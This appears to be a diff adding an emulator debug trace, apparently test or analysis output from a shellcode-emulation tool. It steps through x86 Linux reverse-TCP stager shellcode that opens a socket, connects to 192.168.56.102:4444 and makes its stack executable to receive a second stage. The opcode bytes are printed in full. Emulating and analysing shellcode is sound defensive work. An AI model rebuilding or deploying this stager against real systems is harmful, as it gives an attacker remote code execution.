@@ -1,0 +1,175 @@
+verbose = 3
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] cpu state    eip=0x00417000
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] esp=0x00416fce  ebp=0x00000000  esi=0x00000000  edi=0x00000000
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] Flags: 
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] cpu state    eip=0x00417000
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] esp=0x00416fce  ebp=0x00000000  esi=0x00000000  edi=0x00000000
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] Flags: 
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] 31DB                            xor ebx,ebx
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] cpu state    eip=0x00417002
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] esp=0x00416fce  ebp=0x00000000  esi=0x00000000  edi=0x00000000
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] Flags: PF ZF 
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] F7E3                            mul ebx
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] cpu state    eip=0x00417004
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] esp=0x00416fce  ebp=0x00000000  esi=0x00000000  edi=0x00000000
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] Flags: PF ZF 
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] 53                              push ebx
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] cpu state    eip=0x00417005
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] esp=0x00416fca  ebp=0x00000000  esi=0x00000000  edi=0x00000000
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] Flags: PF ZF 
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] 43                              inc ebx
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] cpu state    eip=0x00417006
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000001
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] esp=0x00416fca  ebp=0x00000000  esi=0x00000000  edi=0x00000000
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] Flags: 
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] 53                              push ebx
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] cpu state    eip=0x00417007
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000001
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] esp=0x00416fc6  ebp=0x00000000  esi=0x00000000  edi=0x00000000
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] Flags: 
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] 6A02                            push byte 0x2
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] cpu state    eip=0x00417009
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000001
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] esp=0x00416fc2  ebp=0x00000000  esi=0x00000000  edi=0x00000000
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] Flags: 
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] B066                            mov al,0x66
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] cpu state    eip=0x0041700b
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] eax=0x00000066  ecx=0x00000000  edx=0x00000000  ebx=0x00000001
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] esp=0x00416fc2  ebp=0x00000000  esi=0x00000000  edi=0x00000000
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] Flags: 
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] 89E1                            mov ecx,esp
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] cpu state    eip=0x0041700d
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] eax=0x00000066  ecx=0x00416fc2  edx=0x00000000  ebx=0x00000001
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] esp=0x00416fc2  ebp=0x00000000  esi=0x00000000  edi=0x00000000
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] Flags: 
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] CD80                            int 0x80
+int socket(int domain=2, int type=1, int protocol=0);
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] cpu state    eip=0x0041700f
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] eax=0x0000000e  ecx=0x00416fc2  edx=0x00000000  ebx=0x00000001
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] esp=0x00416fc2  ebp=0x00000000  esi=0x00000000  edi=0x00000000
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] Flags: 
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] 97                              xchg eax,edi
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] cpu state    eip=0x00417010
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] eax=0x00000000  ecx=0x00416fc2  edx=0x00000000  ebx=0x00000001
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] esp=0x00416fc2  ebp=0x00000000  esi=0x00000000  edi=0x0000000e
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] Flags: 
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] 5B                              pop ebx
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] cpu state    eip=0x00417011
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] eax=0x00000000  ecx=0x00416fc2  edx=0x00000000  ebx=0x00000002
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] esp=0x00416fc6  ebp=0x00000000  esi=0x00000000  edi=0x0000000e
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] Flags: 
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] 68C0A83866                      push dword 0x6638a8c0
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] cpu state    eip=0x00417016
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] eax=0x00000000  ecx=0x00416fc2  edx=0x00000000  ebx=0x00000002
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] esp=0x00416fc2  ebp=0x00000000  esi=0x00000000  edi=0x0000000e
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] Flags: 
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] 680200115C                      push dword 0x5c110002
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] cpu state    eip=0x0041701b
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] eax=0x00000000  ecx=0x00416fc2  edx=0x00000000  ebx=0x00000002
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] esp=0x00416fbe  ebp=0x00000000  esi=0x00000000  edi=0x0000000e
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] Flags: 
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] 89E1                            mov ecx,esp
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] cpu state    eip=0x0041701d
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] eax=0x00000000  ecx=0x00416fbe  edx=0x00000000  ebx=0x00000002
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] esp=0x00416fbe  ebp=0x00000000  esi=0x00000000  edi=0x0000000e
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] Flags: 
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] 6A66                            push byte 0x66
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] cpu state    eip=0x0041701f
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] eax=0x00000000  ecx=0x00416fbe  edx=0x00000000  ebx=0x00000002
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] esp=0x00416fba  ebp=0x00000000  esi=0x00000000  edi=0x0000000e
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] Flags: 
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] 58                              pop eax
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] cpu state    eip=0x00417020
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] eax=0x00000066  ecx=0x00416fbe  edx=0x00000000  ebx=0x00000002
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] esp=0x00416fbe  ebp=0x00000000  esi=0x00000000  edi=0x0000000e
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] Flags: 
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] 50                              push eax
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] cpu state    eip=0x00417021
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] eax=0x00000066  ecx=0x00416fbe  edx=0x00000000  ebx=0x00000002
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] esp=0x00416fba  ebp=0x00000000  esi=0x00000000  edi=0x0000000e
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] Flags: 
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] 51                              push ecx
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] cpu state    eip=0x00417022
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] eax=0x00000066  ecx=0x00416fbe  edx=0x00000000  ebx=0x00000002
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] esp=0x00416fb6  ebp=0x00000000  esi=0x00000000  edi=0x0000000e
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] Flags: 
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] 57                              push edi
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] cpu state    eip=0x00417023
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] eax=0x00000066  ecx=0x00416fbe  edx=0x00000000  ebx=0x00000002
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] esp=0x00416fb2  ebp=0x00000000  esi=0x00000000  edi=0x0000000e
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] Flags: 
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] 89E1                            mov ecx,esp
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] cpu state    eip=0x00417025
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] eax=0x00000066  ecx=0x00416fb2  edx=0x00000000  ebx=0x00000002
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] esp=0x00416fb2  ebp=0x00000000  esi=0x00000000  edi=0x0000000e
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] Flags: 
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] 43                              inc ebx
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] cpu state    eip=0x00417026
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] eax=0x00000066  ecx=0x00416fb2  edx=0x00000000  ebx=0x00000003
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] esp=0x00416fb2  ebp=0x00000000  esi=0x00000000  edi=0x0000000e
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] Flags: PF 
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] CD80                            int 0x80
+connect
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] cpu state    eip=0x00417028
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] eax=0x00000000  ecx=0x00416fb2  edx=0x00000000  ebx=0x00000003
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] esp=0x00416fb2  ebp=0x00000000  esi=0x00000000  edi=0x0000000e
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] Flags: PF 
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] B207                            mov dl,0x7
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] cpu state    eip=0x0041702a
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] eax=0x00000000  ecx=0x00416fb2  edx=0x00000007  ebx=0x00000003
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] esp=0x00416fb2  ebp=0x00000000  esi=0x00000000  edi=0x0000000e
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] Flags: PF 
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] B900100000                      mov ecx,0x1000
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] cpu state    eip=0x0041702f
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] eax=0x00000000  ecx=0x00001000  edx=0x00000007  ebx=0x00000003
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] esp=0x00416fb2  ebp=0x00000000  esi=0x00000000  edi=0x0000000e
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] Flags: PF 
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] 89E3                            mov ebx,esp
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] cpu state    eip=0x00417031
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] eax=0x00000000  ecx=0x00001000  edx=0x00000007  ebx=0x00416fb2
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] esp=0x00416fb2  ebp=0x00000000  esi=0x00000000  edi=0x0000000e
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] Flags: PF 
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] C1EB0C                          shr ebx,0xc
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] cpu state    eip=0x00417034
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] eax=0x00000000  ecx=0x00001000  edx=0x00000007  ebx=0x00000416
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] esp=0x00416fb2  ebp=0x00000000  esi=0x00000000  edi=0x0000000e
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] Flags: CF 
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] C1E30C                          shl ebx,0xc
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] cpu state    eip=0x00417037
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] eax=0x00000000  ecx=0x00001000  edx=0x00000007  ebx=0x00416000
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] esp=0x00416fb2  ebp=0x00000000  esi=0x00000000  edi=0x0000000e
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] Flags: CF PF 
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] B07D                            mov al,0x7d
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] cpu state    eip=0x00417039
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] eax=0x0000007d  ecx=0x00001000  edx=0x00000007  ebx=0x00416000
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] esp=0x00416fb2  ebp=0x00000000  esi=0x00000000  edi=0x0000000e
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] Flags: CF PF 
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] CD80                            int 0x80
+stepcount 28
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] cpu state    eip=0x0041703b
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] eax=0x0000007d  ecx=0x00001000  edx=0x00000007  ebx=0x00416000
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] esp=0x00416fb2  ebp=0x00000000  esi=0x00000000  edi=0x0000000e
+[emu 0x0xf7c0f0 [31;1mdebug[0m ] Flags: CF PF 
+int socket (
+     int domain = 2;
+     int type = 1;
+     int protocol = 0;
+) =  14;
+int connect (
+     int sockfd = 14;
+     struct sockaddr_in * serv_addr = 0x00416fbe => 
+         struct   = {
+             short sin_family = 2;
+             unsigned short sin_port = 23569 (port=4444);
+             struct in_addr sin_addr = {
+                 unsigned long s_addr = 1714989248 (host=192.168.56.102);
+             };
+             char sin_zero = "       ";
+         };
+     int addrlen = 102;
+) =  0;
